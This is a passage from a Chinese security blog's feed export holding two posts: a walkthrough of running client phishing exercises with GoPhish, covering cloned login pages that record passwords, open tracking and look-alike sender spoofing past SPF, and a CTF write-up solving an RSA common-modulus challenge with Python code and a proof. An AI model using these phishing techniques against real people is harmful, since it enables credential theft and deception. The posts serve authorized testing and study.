src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A82-1.png" class="" title="gophish使用"><p>邮件模板内容</p> <img src="/2023/07/13/Gophish/image-20230706103946286.png" class="" title="gophish使用"><p>在模板内容中，跳转的连接使用.URL作为变量，<code>.URL</code>是官方提供的参数，是gophish监听的钓鱼网页链接。</p> <img src="/2023/07/13/Gophish/image-20230706112532319.png" class="" title="gophish使用"><p>3、第三步加载钓鱼页面，如果要记录密码就要勾选上Passwords。Redirect to是钓鱼页面的跳转页面</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A83-1.png" class="" title="gophish使用"><p>下图为钓鱼页面样式</p> <img src="/2023/07/13/Gophish/image-20230706104153836.png" class="" title="gophish使用"><p>下图为钓鱼页面点击提交后跳转页面内容</p> <img src="/2023/07/13/Gophish/image-20230706104707269.png" class="" title="gophish使用"><p>4、然后批量加载收件人</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A84.png" class="" title="gophish使用"><p>5、最后发送，url为监听地址，这里的URL填写配置文档中对应的第二个地址。</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A85-1.png" class="" title="gophish使用"><h4 id="大概流程就是以上那些，下面是遇到问题"><a href="#大概流程就是以上那些，下面是遇到问题" class="headerlink" title="大概流程就是以上那些，下面是遇到问题"></a>大概流程就是以上那些，下面是遇到问题</h4><p>后面客户要求钓鱼页面使用他们公司内部的网站，然后我们尝试直接copy要钓鱼的页面。</p> <img src="/2023/07/13/Gophish/image-20230707145236063.png" class="" title="gophish使用"><p>在此次项目中，因为客户的页面在内网，钓鱼平台在外网，所以无法直接copy页面；直接copy页面的源代码出现没有样式，排版很乱等问题。</p><p>然后使用火狐插件 Save Page WE下载地址：<a href="https://addons.mozilla.org/zh-CN/firefox/addon/save-page-we/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search%E3%80%82">https://addons.mozilla.org/zh-CN/firefox/addon/save-page-we/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search。</a>  使用插件来copy页面，样式可以完美copy。但是又出现了新问题，input标签不能编辑，最后是class的问题，删除了对应的class。</p><p><strong>就以为一切都结束了，又出现了新的问题，加载图片的功能不能用了，无法记录谁打开过邮件。</strong></p><p>这里有一个小坑，如果在gophish的<code>config.json</code>中<code>phish_server</code>设置<code>use_tls</code>为<code>false</code>，即监听的钓鱼网页不启用https的，在某些邮件服务器打开邮件的时候，应该请求http，但是自动跳转的是https，并且有概率会请求失败，这就导致数据统计有一定的不准确性。参考链接：<a href="https://toutiao.io/posts/htszx7d/preview">https://toutiao.io/posts/htszx7d/preview</a></p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A86.png" class="" title="gophish使用"><p>所以在配置文件中把use_tls设置为true。</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A87.png" class="" title="gophish使用"><p>配置文件修改内容</p> <img src="/2023/07/13/Gophish/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230710090350.png" class="" title="gophish使用"><p><strong>做项目时出现的问题：</strong></p><p>邮件标题问题导致用户接收不到邮件，到底是为什么不太清楚</p><p>发送延迟问题，怀疑是用户组使用了中文或者平台问题</p><p>copy的客户网站页面，用户名和密码不能编辑，原因是对应的class，注释到就可以了</p><p>如果想要记录谁打开了邮件，就要使用https协议，问题会有两个：</p><p>​1.收到邮件打开后，点击链接跳转不过去。可能会被受害者那边的安全策略拦截掉。</p><p>​2.https没有证书，受害者点击链接能够跳转过去的话，也会给安全告警提示。·</p><h2 id="2024年7月17日更新"><a href="#2024年7月17日更新" class="headerlink" title="2024年7月17日更新"></a>2024年7月17日更新</h2><p>今年客户要求伪造发件人，例如客户域名为：gophish.com，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">发件人理想状态：管理员&lt;<span class="hljs-symbol">admin@</span>gophish.com&gt;<br></code></pre></td></tr></table></figure><p>但是由于SPF限制</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">实际伪造的发件人：管理员&lt;<span class="hljs-symbol">admin@</span>gophihs.com&gt;<br></code></pre></td></tr></table></figure><p>去年用的腾讯邮件服务区，但是买什么域名就只能用什么域名伪造，有局限性。所以今年自己搭建了一个邮件服务器</p><p>sendmail服务用apt安装的，和gophish搭建在了一个服务器上，用的外网服务器所以25端口能用。</p><p>gophish需要修改的地方</p><p><img src="/img/gofish/image-20240717170101528.png" alt="image-20240717170101528"></p><p>要保证Email Templates和Sending Profiles红框里这两个地方一样，要不然邮件会显示代发。host就127.0.0.1，不需要填用户名和密码了</p><p>其他的应该跟以前一样，忘了哈哈哈哈哈哈</p><p><img src="/img/gofish/image-20240717171503205.png" alt="image-20240717171503205"></p><p><strong>参考链接：</strong></p><p><a href="https://xz.aliyun.com/t/11898#toc-0">企业级钓鱼演练平台搭建 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/540029594">宸极实验室——『工具使用』钓鱼平台 Gophish - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>实践经历</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钓鱼</tag>
      
      <tag>GoPhish</tag>
      
      <tag>腾讯邮件推送服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>共模攻击</title>
    <link href="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    <url>/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原题文件中存在两个文件message-txt和task-py"><a href="#原题文件中存在两个文件message-txt和task-py" class="headerlink" title="原题文件中存在两个文件message.txt和task.py"></a>原题文件中存在两个文件message.txt和task.py</h2><ul><li>message.txt文件</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span><br>c1=<span class="hljs-number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span><br>c2=<span class="hljs-number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span><br></code></pre></td></tr></table></figure><ul><li>task.py文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>flag = f.read()<br>f.close()<br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e1 = <span class="hljs-number">65536</span><br>e2 = <span class="hljs-number">270270</span><br>c1 = <span class="hljs-built_in">pow</span>(m, e1, n)<br>c2 = <span class="hljs-built_in">pow</span>(m, e2, n)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;message.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;n=&#x27;</span> + <span class="hljs-built_in">str</span>(n) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;c1=&#x27;</span> + <span class="hljs-built_in">str</span>(c1) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;c2=&#x27;</span> + <span class="hljs-built_in">str</span>(c2) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.close()<br></code></pre></td></tr></table></figure><h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span><br>e1=<span class="hljs-number">65536</span><br>e2= <span class="hljs-number">270270</span><br>c1=<span class="hljs-number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span><br>c2=<span class="hljs-number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br>s,s1,s2=gmpy2.gcdext(e1,e2)   <span class="hljs-comment">#e1*s1+e2*s2=2</span><br><span class="hljs-built_in">print</span>(s,s1,s2)  <span class="hljs-comment">#此时s=2，最大公约数</span><br>m1=(<span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n))%n  <span class="hljs-comment">#扩展欧几里得算法</span><br>m,t=gmpy2.iroot(m1,<span class="hljs-number">2</span>)   <span class="hljs-comment">#[0]是m的值，[1]是t的值true还是false</span><br><span class="hljs-keyword">if</span> t:<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><h2 id="共模攻击的原理"><a href="#共模攻击的原理" class="headerlink" title="共模攻击的原理"></a>共模攻击的原理</h2>  <img src="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB-1.png" class="" title="原理">  <img src="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB-2.png" class="" title="原理"><ul><li>上面解题代码中m1&#x3D;(pow(c1,s1,n)<em>pow(c2,s2,n))%n与数学中（c1^s1</em>c2^s2）%n这个式子是同一个，下面证明这个式子能够化简出明文。（“%”是取余数）<ul><li>将c1，c2带入到上面的式子（c1^s1<em>c2^s2）%n里，进行一系列数论中的模运算，有：<br>（c1^s1</em>c2^s2）%n&#x3D;（（m^e1%n）^s1*（m^e2%n）^s2）%n</li><li>根据模运算的性质（a<em>b）%p&#x3D;（a%p</em>b%p）%p得：<br>（（m^e1%n）^s1<em>（m^e2%n）^s2）%n&#x3D;（（（m^e1%n）^s1）%n</em>（（m^e2%n）^s2）%n）%p</li><li>根据模运算的性质（（a%p）^b）%p&#x3D;a^b%p得：<br>（（（m^e1%n）^s1）%n<em>（（m^e2%n）^s2）%n）%p&#x3D;（（（m^e1）^s1%n）</em>（（m^e2）^s2%n））%p</li><li>根据模运算的性质（a%p<em>b%p）%p&#x3D;（a</em>b）%p得：<br>（（（m^e1）^s1%n）<em>（（m^e2）^s2%n））%p&#x3D;（（m^e1）^s1</em>（m^e2）^s2）%p</li><li>由幂的乘方，底数不变，指数相乘可得：<br>（m^（e1<em>s1）</em>m^（e2*s2））%p</li><li>由同底数幂相乘，底数不变，指数相加可得：<br>（m^（e1<em>s1+e2</em>s2））%n</li><li>因为e1<em>s1+e2</em>s2&#x3D;1，所以（c1^s1<em>c2^s2）%n&#x3D;（m^1）%n,因为m小于n,所以（c1^s1</em>c2^s2）%n&#x3D;m。</li></ul></li></ul><p>共模攻击，正常情况下e1和e2是互素的最大公约数应该是1<br>而现在的e1和e2分别为65536，270270他们最大公约数是2，可得（e1<em>s1+e2</em>s2）&#x3D;2，<br>就有（c1^s1<em>c2^s2）%n&#x3D;（m^2）%n—&gt;（c1^s1</em>c2^s2）%n&#x3D;m^2.<br>然后对m开平方的可以了</p>]]></content>
    
    
    <categories>
      
      <category>个人学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>RSA</tag>
      
      <tag>共模攻击</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
